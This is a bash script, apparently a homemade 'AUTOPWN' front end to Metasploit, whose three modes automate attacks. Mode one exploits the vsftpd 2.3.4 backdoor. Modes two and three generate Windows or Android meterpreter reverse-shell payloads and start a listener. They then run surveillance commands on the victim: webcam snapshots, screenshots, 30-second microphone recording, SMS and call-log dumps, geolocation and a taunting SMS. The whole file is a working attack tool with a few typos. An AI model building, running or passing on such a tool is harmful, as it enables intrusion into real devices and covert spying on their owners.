#!/bin/bash

red="\033[38;5;196m"
green="\033[38;5;82m"
yellow="\033[0;33m"
blue="\033[38;5;51m"
reset="\033[0m" # Reset color to default

toilet -f mono12 -F metal -W AUTOPWN | lolcat
echo -e "AUTOMATED METASPLOIT TOOLKIT" | lolcat
cowsay -f dragon-and-cow PROFESSOR VISHAL | lolcat
sleep 3

num=1
while true
do

        figlet CHOOSE A METHOD TO SCAN TARGET -c | lolcat

	echo -e "${yellow}[1]FTP EXPLOIT${reset}"
	echo -e "${blue}[2]WINDOWS EXPLOIT${reset}"
        echo -e "${green}[3]ANDROID EXPLOIT\n${reset}"

	read msfmethod;

	case $msfmethod in
		1)
			echo -e "Enter remote host's address (RHOST) : " | lolcat
			read RHOST
			echo -e "\nEnter Remote port's address (RPORT) : " | lolcat
			read RPORT

			echo -e "STARTED TO PERFORM FTP ATTACK ON THE TARGET SYSTEM .... " | lolcat
			sleep 2

				expect <<EOF
spawn msfconsole
expect
send "use exploit/unix/ftp/vsftpd_234_backdoor\r"
expect
send "set RHOSTS $RHOST\r"
expect
send "set RPORT $PORT\r"
expect
send "run\r"
expect
send "ls -D */\r"
expect
send "whoami\r"
expect
send "ls\r"
expect
send "pwd\r"
expect
send "cd /home/msfadmin/vulnerable\r"
expect
send "exit\r"
EOF

			echo -e "\nSUCCESSFULLY ATTACKED THE FTP SERVICE RUNNING IN THE TARGET !!!" | lolcat
			;;

		2)
                        echo -e "\nEnter local host's address (LHOST) : " | lolcat
			read LHOST

                        echo -e "\nEnter local port's address (LHOST) : " | lolcat
			read LPORT

			echo -e "\nEnter the Directory/Location to save the payload : " | lolcat
			read loc

			echo -e "\nEnter the type of system to hack [x84/x64]: " | lolcat
			echo -e "[1] x86" | lolcat
			echo -e "[2] x64" | lolcat
			read type

			if [ $type -eq 1 ]
			then
				arch="x86"
			else
				arch="x64"

			fi

			echo -e "\nEnter the type of payload to generate [rev_TCP/rev_HTTP]: " | lolcat
			echo -e "[1]TCP" | lolcat
			echo -e "[2]HTTP" | lolcat
			read pay

			if [ $pay -eq 1 ]
			then
				payload="reverse_tcp"
			else
				payload="reverse_http"

			fi


			msfvenom -p windows/$arch/meterpreter/$payload lhost=$LHOST lport=$LPORT -o $loc

			chmod +x $loc
			chmod -R 777 $loc

			echo -e "\nSENT THE MALWARE TO THE TARGET..? EXPLOIT NOW..? [press any key to continue] : \n" | lolcat
			read continue

			echo -e "\nSTARTED TO EXPLOIT WINDOWS $arch MACHINE .... " | lolcat
			sleep 2

                                expect <<EOF
spawn msfconsole
expect
send "use exploit/multi/handler\r"
expect
send "set payload windows/$arch/meterpreter/$payload\r"
expect
send "set LHOST $LHOST\r"
expect
send "set LPORT $LPORT\r"
expect
send "run\r"
expect
send "?\r"
expect
send "webcam_list\r"
expect
send "webcam_snap\r"
expect
send "sysinfo\r"
expect
send "getuid\r"
expect
send "screenshot\r"
expect
send "screenshare\r"
expect
send "record_mic -d 30\r"
expect
send "exit\r"
EOF

			;;

		3)
                        read -p "Enter local host's address (LHOST) : " LHOST
                        read -p "Enter local port's address (LHOST) : " LPORT
			read -p "Enter the target's pivot mobile number to send sms : " NUM
                        read -p "Enter the Directory/Location to save the payload : " loc

                        msfvenom -p android/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -o $loc

                        chmod +x $loc
                        chmod -R 777 $loc

                                expect <<EOF
spawn msfconsole
expect
send "use exploit/multi/handler\r"
expect
send "set payload android/meterpreter/reverse_tcp\r"
expect
send "set LHOST $LHOST\r"
expect
send "set LPORT $LPORT\r"
expect
send "run\r"
expect
send "?\r"
expect
send "?\r"
expect
send "dump_sms\r"
expect
send "dump_calllog\r"
expect
send "send_smd -d $NUM -t "MY MOBILE IS BEEN HACKED BY PROFESSOR"\r"
expect
send "webcam_list\r"
expect
send "webcam_snap\r"
expect
send "sysinfo\r"
expect
send "getuid\r"
expect
send "record_mic -d 30\r"
expect
send "geolocate\r"
expect
send "screenshare\r"
expec
send "screenshot\r"
expect
send "exit\r"
EOF

                        ;;



		*) 
			echo -e "${red}INVALID OPTION :( \n${reset}"
			;;

	esac


        echo -e "\n${yellow}Want to exploit more targets?\n${reset}"
        echo -e "${green}1.CONTINUE${reset}"
        echo -e "${red}2.EXIT\n${reset}"
        read conti

        if [ $conti -eq 1 ]
        then
                echo -e "${green}OK${reset}"
        else
                cowsay -f kiss COME BACK SOON !!! | lolcat
                break

        fi
        sleep 5.5

        echo -e "${reset}"

done

